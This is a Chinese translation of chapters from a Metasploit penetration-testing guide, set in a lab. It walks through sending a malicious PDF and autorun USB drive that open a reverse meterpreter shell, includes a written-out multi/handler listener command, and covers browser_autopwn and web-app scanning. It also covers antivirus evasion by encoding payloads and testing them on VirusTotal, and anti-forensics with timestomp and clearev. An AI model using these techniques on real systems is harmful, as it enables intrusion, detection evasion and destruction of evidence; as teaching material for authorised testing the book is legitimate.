![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f0cbdedb-ea6c-4a98-a8ae-473bc7e04dec.jpg)

选择选项 1，将 Windows Reverse TCP Shell 作为我们的利用载荷。然后，使用 LHOST 变量设置攻击者机器的 IP 地址（在本例中是`192.168.44.134`）和要监听的端口（在本例中是`443`）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d914a2d0-231e-44d4-a00b-4c77d13392d1.jpg)

PDF 文件已在目录`/root/.set/`中生成。现在我们需要使用任何可用的通信媒介将其发送给我们的受害者。同时，我们还需要启动一个监听器，该监听器将接受来自目标的反向 meterpreter 连接。我们可以使用以下命令启动监听器：

```
msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.44.134; set LPORT 443; run; exit -y"
```

另一方面，我们的受害者收到了 PDF 文件，并尝试使用 Adobe Reader 打开它。Adobe Reader 崩溃了，但没有迹象表明受害者受到了威胁：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b642bc1f-1c93-4e9c-afdb-3d4690c4a463.jpg)

在监听端（攻击者系统上），我们得到了一个新的 meterpreter shell！我们可以在下面的截图中看到这一点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5d733890-4f7b-4a57-b255-0a23733c83f4.jpg)

# 创建传染性媒体驱动器

打开社会工程工具包，从主菜单中选择选项 3 传染性媒体生成器，如下截图所示。然后，选择选项 2 创建标准的 Metasploit 可执行文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bf1e1374-7e0e-46bf-afd0-0849788695c6.jpg)

现在，选择选项 1，将 Windows Shell Reverse TCP 作为我们的利用载荷。然后，在 LHOST 变量中设置 IP 地址和要监听的端口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/bd7b7dda-3caf-4631-8bfc-35cd4e2381c2.jpg)

社会工程工具包将生成一个名为*autorun*的文件夹，位于`/root/.set/`。这个文件夹可以复制到 USB 闪存驱动器或 CD/DVD-ROM 中，以分发给我们的受害者。与此同时，我们还需要设置一个监听器（如前面部分所示），然后等待我们的受害者将受感染的媒体插入他的系统。

# 浏览器自动攻击

用于执行客户端攻击的另一个有趣的辅助模块是`browser_autopwn`。这个辅助模块按以下顺序工作：

1.  攻击者执行`browser_autopwn`辅助模块。

1.  攻击者在其系统上启动一个 Web 服务器，托管一个载荷。这个载荷可以通过特定的 URL 访问。

1.  攻击者向受害者发送特制的 URL。

1.  受害者试图打开 URL，这时载荷就会下载到他的系统上。

1.  如果受害者的浏览器存在漏洞，攻击成功，攻击者就会获得一个 meterpreter shell。

从`msfconsole`中，使用`use auxiliary/server/browser_autopwn`命令选择`browser_autopwn`模块，如下截图所示。然后，配置 LHOST 变量的值并运行辅助模块：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f388f8bb-66f0-44f5-a5a2-ddb2d3d525da.png)

运行辅助模块将创建许多不同的利用/载荷组合实例，因为受害者可能使用任何类型的浏览器：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/125152ae-8b2f-4627-96e1-e4ae1f3c5029.png)

在目标系统上，我们的受害者打开了 Internet Explorer，并尝试访问恶意 URL `http://192.168.44.134:8080`（我们使用`browser_autopwn`辅助模块设置的）：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b9c52092-505d-421a-9bfb-72964643e633.png)

回到我们的 Metasploit 系统，我们的受害者一打开特制的 URL，我们就获得了一个 meterpreter shell：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9a2a8c5b-fc48-4c01-84f6-c71d727932da.jpg)

# 总结

在本章中，我们学习了如何使用各种工具和技术来发动高级客户端攻击并绕过网络边界限制。

在下一章中，我们将深入探讨 Metasploit 在测试 Web 应用程序安全性方面的能力。

# 练习

您可以尝试以下练习：

+   熟悉`msfvenom`的各种参数和开关

+   探索社会工程工具包提供的各种其他社会工程技术


# 第七章：使用 Metasploit 进行 Web 应用程序扫描

在上一章中，我们概述了如何使用 Metasploit 来发动欺骗性的客户端攻击。在本章中，您将学习 Metasploit Framework 的各种功能，用于发现 Web 应用程序中的漏洞。在本章中，我们将涵盖以下主题：

+   设置易受攻击的 Web 应用程序

+   使用 WMAP 进行 Web 应用程序漏洞扫描

+   用于 Web 应用程序枚举和扫描的 Metasploit 辅助模块

# 设置易受攻击的应用程序

在我们开始探索 Metasploit Framework 提供的各种 Web 应用程序扫描功能之前，我们需要建立一个测试应用程序环境，以便进行测试。正如在前几章中讨论的那样，*Metasploitable 2*是一个故意制造漏洞的 Linux 发行版。它还包含了故意制造漏洞的 Web 应用程序，我们可以利用这一点来练习使用 Metasploit 的 Web 扫描模块。

为了使易受攻击的测试应用程序运行起来，只需启动`metasploitable 2`；Linux，并从任何 Web 浏览器远程访问它，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2257bed3-cc62-46d1-a14d-4488912ffc65.jpg)

在 metasploitable 2 分发版上默认运行两个不同的易受攻击的应用程序，Mutillidae 和**Damn Vulnerable Web Application**（**DVWA**）。易受攻击的应用程序可以进一步进行测试，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1554dfaf-ef84-4a60-b2dd-918205226acf.jpg)

# 使用 WMAP 进行 Web 应用程序扫描

WMAP 是 Kali Linux 中可用的强大的 Web 应用程序漏洞扫描器。它以插件的形式集成到 Metasploit Framework 中。为了使用 WMAP，我们首先需要在 Metasploit 框架中加载和初始化插件，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/696e9e17-1793-4d66-8be4-4e7286f99a1c.jpg)

一旦`wmap`插件加载到 Metasploit Framework 中，下一步是为我们的扫描创建一个新站点或工作空间。站点创建后，我们需要添加要扫描的目标 URL，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9e8073bf-3952-4d47-8876-eb00b0b5f1a2.jpg)

现在我们已经创建了一个新站点并定义了我们的目标，我们需要检查哪些 WMAP 模块适用于我们的目标。例如，如果我们的目标没有启用 SSL，则对此运行 SSL 相关测试就没有意义。这可以使用`wmap_run -t`命令来完成，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ceff14a2-3635-45b5-9a56-3c2dfce6fed6.jpg)

现在我们已经枚举了适用于对我们易受攻击的应用程序进行测试的模块，我们可以继续进行实际的测试执行。这可以通过使用`wmap_run -e`命令来完成，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b668b474-7699-4a2d-981a-31b490e12ed8.jpg)

在我们的目标应用程序上成功执行测试后，发现的漏洞（如果有）将存储在 Metasploit 的内部数据库中。然后可以使用`wmap_vulns -l`命令列出漏洞，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/cde1f4fd-8c23-4bae-976a-7b0feeeaf2e2.jpg)

# 使用 Metasploit 的 Web 应用程序枚举和扫描辅助模块

在第四章*使用 Metasploit 进行信息收集*中，我们已经看到了 Metasploit Framework 中用于枚举 HTTP 服务的一些辅助模块。接下来，我们将探索一些其他可以有效用于枚举和扫描 Web 应用程序的辅助模块：

+   **cert**：此模块可用于枚举目标 Web 应用程序上的证书是否有效或已过期。其辅助模块名称为`auxiliary/scanner/http/cert`，其使用方法如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7a7f4c2d-0540-4327-92c9-b8246254c8fe.jpg)

需要配置的参数如下：

+   **RHOSTS:** 要扫描的目标的 IP 地址或 IP 范围

还可以通过指定包含目标 IP 地址列表的文件，同时在多个目标上运行模块，例如，设置 RHOSTS `/root/targets.lst`。

+   `dir_scanner`：该模块检查目标 Web 服务器上各种目录的存在。这些目录可能会透露一些有趣的信息，如配置文件和数据库备份。其辅助模块名称为`auxiliary/scanner/http/dir_scanner`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/439145d9-c2af-4738-b13e-f37a5ce72d40.jpg)

要配置的参数如下：

+   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

+   `enum_wayback`：[`www.archive.org`](http://www.archive.org) 存储了任何给定网站的所有历史版本和数据。它就像一个时光机，可以展示多年前特定网站的样子。这对于目标枚举可能很有用。`enum_wayback`模块查询[`www.archive.org`](http://www.archive.org)，以获取目标网站的历史版本。

其辅助模块名称为`auxiliary/scanner/http/enum_wayback`，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eac308d0-8420-4e7c-9768-a89c3f995f2f.jpg)

要配置的参数如下：

+   **RHOSTS**：要查询其存档的目标域名

+   `files_dir`：该模块搜索目标，查找可能无意中留在 Web 服务器上的任何文件。这些文件包括源代码、备份文件、配置文件、存档和密码文件。其辅助模块名称为`auxiliary/scanner/http/files_dir`，以下截图显示了如何使用它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b1ad24dd-ad33-4ae8-98be-d7141345cf3e.jpg)

要配置的参数如下：

+   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

+   `http_login`：如果目标系统启用了基于 HTTP 的身份验证，该模块尝试暴力破解。它使用 Metasploit Framework 中提供的默认用户名和密码字典。其辅助模块名称为`auxiliary/scanner/http/http_login`，以下截图显示了如何使用它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d9b8234d-a8c7-4d43-9057-7fcbd6a0099a.jpg)

要配置的参数如下：

+   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

+   `options`**:** 该模块检查目标 Web 服务器上是否启用了各种`HTTP`方法，如`TRACE`和`HEAD`。这些方法通常是不必要的，攻击者可以利用它们来策划攻击向量。其辅助模块名称为`auxiliary/scanner/http/options`，以下截图显示了如何使用它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/19e3d025-9143-40ed-abbe-fbdf8fb88cac.jpg)

要配置的参数如下：

+   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

+   `http_version`**:** 该模块枚举目标并返回 Web 服务器和底层操作系统的确切版本。然后可以使用版本信息启动特定攻击。其辅助模块名称为`auxiliary/scanner/http/http_version`，以下截图显示了如何使用它：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f30527d8-9968-482a-b66c-184d94039659.jpg)

要配置的参数如下：

+   **RHOSTS**：要扫描的目标的 IP 地址或 IP 范围

# 总结

在本章中，我们探讨了 Metasploit Framework 的各种功能，可用于 Web 应用程序安全扫描。在前往下一章之前，您将学习各种技术，可用于将我们的有效负载隐藏在防病毒程序中，并在入侵系统后清除我们的痕迹。

# 练习

查找并利用以下易受攻击的应用程序中的漏洞：

+   DVWA

+   Mutillidae

+   OWASP Webgoat


# 第八章：防病毒逃避和反取证

在前两章中，您学习了如何利用 Metasploit 框架生成自定义有效负载并发动高级客户端攻击。然而，如果我们生成的有效负载被防病毒程序检测并阻止，那么它们将毫无用处。在本章中，我们将探讨各种技术，以使我们的有效负载尽可能不被检测。您还将熟悉在成功妥协后覆盖我们的踪迹的各种技术。

在本章中，我们将涵盖以下主题：

+   使用编码器避免 AV 检测

+   使用二进制加密和打包技术

+   测试有效负载以检测和沙盒概念

+   使用 Metasploit 反取证技术，如 TimeStomp 和 clearev

# 使用编码器避免 AV 检测

在第六章《使用 Metasploit 进行客户端攻击》中，我们已经看到如何使用`msfvenom`实用程序生成各种有效负载。然而，如果原样使用这些有效负载，它们很可能会被防病毒程序检测到。为了避免我们的有效负载被防病毒程序检测到，我们需要使用`msfvenom`实用程序提供的编码器。

要开始，我们将使用`shikata_ga_nai`编码器生成`.exe`格式的简单有效负载，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7856da75-05bd-465a-ac10-953e294e84c3.jpg)

一旦有效负载生成，我们将其上传到网站[`www.virustotal.com`](http://www.virustotal.com)进行分析。分析完成后，我们可以看到我们的文件`apache-update.exe`（包含有效负载）被使用的 60 个防病毒程序中的 46 个检测到。这对于我们的有效负载来说是相当高的检测率。将此有效负载原样发送给受害者的成功可能性较小，因为它的检测率。现在，我们必须努力使它不被尽可能多的防病毒程序检测到。

该网站[`www.virustotal.com`](http://www.virustotal.com)运行来自各种供应商的多个防病毒程序，并使用所有可用的防病毒程序扫描上传的文件。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/ba9c2e20-50ab-463f-8ac0-4f8732a822b0.jpg)

仅仅一次使用`shikata_ga_nai`编码器对我们的有效负载进行编码并没有很好地工作。`msfvenom`实用程序还有一个选项，可以多次迭代编码过程。通过多次迭代编码器对我们的有效负载进行处理可能会使其更隐蔽。现在，我们将尝试生成相同的有效负载；但是，这次我们将尝试运行编码器 10 次，以使其隐蔽，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/5a1a20b2-5715-4436-84e7-e6935405cfa1.png)

现在有效负载已生成，我们再次将其提交到[`www.virustotal.com`](http://www.virustotal.com)进行分析。如下面的屏幕截图所示，分析结果显示，这次我们的有效负载被 60 个防病毒程序中的 45 个检测到。因此，它比我们之前的尝试稍好，但仍然不够好：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/456213ec-abd7-496a-9647-79e9af960d20.jpg)

为了进一步尝试使我们的有效负载不被检测到，这次我们将尝试将编码器从`shikata_ga_nai`（之前使用的）更改为一个名为`opt_sub`的新编码器，如下面的屏幕截图所示。我们将在我们的有效负载上运行编码器五次：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2a1c1e92-11d9-4206-b308-7dda60e66e93.jpg)

一旦有效负载生成，我们将提交它进行分析到[`www.virustotal.com`](http://www.virustotal.com)。这次，结果看起来好多了！只有 25 个防病毒程序中的 25 个能够检测到我们的有效负载，而之前有 45 个能够检测到，如下面的屏幕截图所示。这确实是一个显著的改进：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/3ced90e2-30e6-464d-b828-36a2965d2e03.png)

您可能已经了解到，没有单一的秘密配方可以使我们的有效负载完全不被检测到。

使载荷不可检测的过程涉及使用各种排列组合和不同编码器的各种试验和错误方法。您必须不断尝试，直到载荷的检测率降到可接受的水平。

然而，非常重要的一点是，有时在载荷上运行多次编码器的迭代甚至可能损坏原始载荷代码。因此，最好在将其发送到目标系统之前，确实通过在测试实例上执行来验证载荷。

# 使用打包程序和加密程序

在前面的部分中，我们已经看到如何利用各种编码器来使我们的载荷免受杀毒程序的检测。然而，即使使用不同的编码器和迭代，我们的载荷仍然被一些杀毒程序检测到。为了使我们的载荷完全隐蔽，我们可以利用一个叫做`加密自解压缩存档`的功能，这是由一个叫做`7-Zip`的压缩实用程序提供的。

首先，我们将把一个恶意的 PDF 文件（包含一个载荷）上传到网站[`www.virustotal.com`](http://www.virustotal.com)，如下面的截图所示。分析显示，我们的 PDF 文件被 56 个可用的杀毒程序中的 32 个检测到，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/903b0055-40c3-4878-a1bd-af6f99047f95.jpg)

现在，使用 7-Zip 实用程序，如下面的截图所示，我们将我们的恶意 PDF 文件转换成一个自解压缩存档：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/9b06f716-a34a-4de7-ab06-ce6aad8e81a7.jpg)

分析结果，如下面的截图所示，显示了被转换成自解压缩存档的 PDF 文件被 59 个可用的杀毒程序中的 21 个检测到。这比我们之前的尝试（32/56）要好得多：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fea868f8-3ef4-4c4a-97aa-41d046ea7cf5.jpg)

现在，为了使载荷更加隐蔽，我们将把我们的载荷转换成一个受密码保护的自解压缩存档。这可以通过 7-Zip 实用程序来完成，如下面的截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/579dedf9-2a23-4ec9-a360-6ca72eb4af06.jpg)

现在，我们将把密码加密的载荷上传到网站[`www.virustotal.com`](http://www.virustotal.com)并检查结果，如下面的截图所示。有趣的是，这一次没有一个杀毒程序能够检测到我们的载荷。现在，我们的载荷将在整个传输过程中不被检测到，直到它到达目标。然而，密码保护为最终用户（受害者）执行载荷增加了另一个障碍：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/35fc08ae-23b0-4b5b-a73f-33c6fcdc50af.jpg)

# 什么是沙箱？

无论我们执行一个应用程序，无论是合法的还是恶意的，都会发生以下事件：

+   应用程序直接与主机操作系统交互

+   系统调用被执行

+   建立网络连接

+   注册表条目被修改

+   事件日志被写出

+   临时文件被创建或删除

+   新的进程被生成

+   配置文件被更新

所有上述事件都是持久性的，并改变了目标系统的状态。现在，可能会有一种情况，我们必须以受控的方式测试一个恶意程序，以便测试系统的状态保持不变。这正是沙箱可以发挥重要作用的地方。

想象一下，沙箱是一个隔离的容器或隔间。在沙箱内执行的任何东西都会留在沙箱内，不会影响外部世界。在沙箱内运行一个载荷样本将帮助您分析其行为，而不会影响主机操作系统。

有几个开源和免费的沙箱框架可用，如下所示：

+   Sandboxie：[`www.sandboxie.com`](https://www.sandboxie.com)

+   Cuckoo 沙箱：[`cuckoosandbox.org/`](https://cuckoosandbox.org/)

探索这些沙箱的功能超出了本书的范围；然而，尝试这些沙箱进行恶意载荷分析是值得的。

# 反取证

在过去的十年左右，数字取证技术有了实质性的改进和进步。取证工具和技术已经得到了很好的发展和成熟，可以在发生违规/欺诈或事件时搜索、分析和保留任何数字证据。 

在整本书中，我们已经看到了 Metasploit 如何用于妥协远程系统。Meterpreter 使用内存中的`dll`注入，并确保除非明确需要，否则不会写入磁盘。然而，在妥协过程中，我们经常需要执行某些修改、添加或删除远程文件系统上的文件的操作。这意味着如果对被妥协的系统进行取证调查，我们的行为将被追溯。

成功地妥协我们的目标系统是一部分，而确保我们的妥协即使从法医角度来看也不被察觉和发现是另一个重要部分。幸运的是，Metasploit 框架提供了工具和实用程序，帮助我们清除我们的足迹，并确保在系统上留下最少或没有我们的妥协证据。

# Timestomp

文件系统中的每个文件和文件夹，无论操作系统的类型如何，都有与之关联的元数据。元数据只是特定文件或文件夹的属性，包含诸如创建、访问和修改时间和日期、磁盘上的大小、所有权信息以及一些其他属性，比如是否标记为只读或隐藏。在任何欺诈或事件发生时，这些元数据可以揭示大量有用的信息，可以追溯攻击。

除了元数据的关注，还有一些安全程序被称为`文件完整性监视器`，它们不断监视文件是否发生变化。现在，当我们妥协一个系统并在其上获得 meterpreter shell 时，我们可能需要访问该系统上的现有文件，创建新文件或修改现有文件。当我们进行这些更改时，它显然会以更改的时间戳的形式反映在元数据中。这可能会引起警报或在事件调查中泄露线索。为了避免通过元数据留下我们的痕迹，我们希望覆盖我们在妥协过程中访问或创建的每个文件和文件夹的元数据信息（特别是时间戳）。

Meterpreter 提供了一个非常有用的实用程序，称为`timestomp`，您可以使用它覆盖任何文件或文件夹的时间戳值。

一旦我们在被妥协的系统上获得了 meterpreter shell，下面的屏幕截图显示了`timestomp`实用程序的帮助菜单：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1277aee3-a8b9-4fd1-9e19-557e58534c6f.jpg)

下面的屏幕截图显示了在使用`timestomp`之前文件`Confidential.txt`的时间戳：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e1561309-9c50-4474-95fa-c9de6e7d58f6.jpg)

现在，我们将利用 SMB `MS08_67_netapi`漏洞妥协我们的目标系统，然后使用`timestomp`实用程序修改文件`Confidential.txt`的时间戳，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/fe7cf3dd-69c5-4220-bca4-a5e310e66579.jpg)

使用`timestomp`实用程序修改文件时间戳后，我们可以看到文件`Confidential.txt`的更改时间戳值，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b6c9b58c-6938-4fc4-a591-d439b6d014d3.jpg)

# clearev

每当我们与 Windows 系统交互时，所有操作都以事件日志的形式记录下来。事件日志分为三类，即应用程序日志、安全日志和系统日志。在系统故障或安全妥协的情况下，调查员/管理员最有可能首先看到事件日志。

假设我们通过某些漏洞入侵了 Windows 主机。然后，我们使用 meterpreter 上传新文件到被入侵的系统。我们还提升了权限并尝试添加新用户。现在，这些操作将被记录在事件日志中。在我们付出所有努力进行入侵之后，我们肯定不希望我们的行动被发现。这时，我们可以使用一个名为`clearev`的 meterpreter 脚本来清除所有日志并清除我们的活动痕迹。

以下截图显示了存储和显示所有事件日志的“Windows 事件查看器”应用程序：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/683e1425-ed41-41a5-aabd-0553064da81a.jpg)

现在，我们使用 SMB`MS08_67_netapi`漏洞来入侵目标 Windows 系统，并获得了 meterpreter 访问。我们在 meterpreter shell 中输入`clearev`命令（如下截图所示），它简单地清除了被入侵系统上的所有日志：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/80ff4eaf-1fc3-4524-9203-ac7340b76f04.jpg)

回到我们被入侵的 Windows 系统，我们检查了“事件查看器”，发现所有日志都已清除，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2ead8953-20dd-406f-8abb-dbf4ccf9d95a.jpg)

# 总结

在本章中，您探索了使有效载荷不可检测的各种技术，并了解了与反取证相关的 Metasploit Framework 的各种能力。在前往下一章之前，我们将深入研究一种名为 Armitage 的网络攻击管理工具，该工具在后台使用 Metasploit，并简化了更复杂的渗透测试任务。

# 练习

您可以尝试以下练习：

+   使用`msfvenom`实用程序生成有效载荷，然后尝试使用各种编码器使其在[`www.virustotal.com`](https://www.virustotal.com)上最不可检测

+   探索一个名为`Hyperion`的工具，使有效载荷不可检测

+   尝试使用任何沙箱应用程序来分析使用`msfvenom`实用程序生成的有效载荷的行为
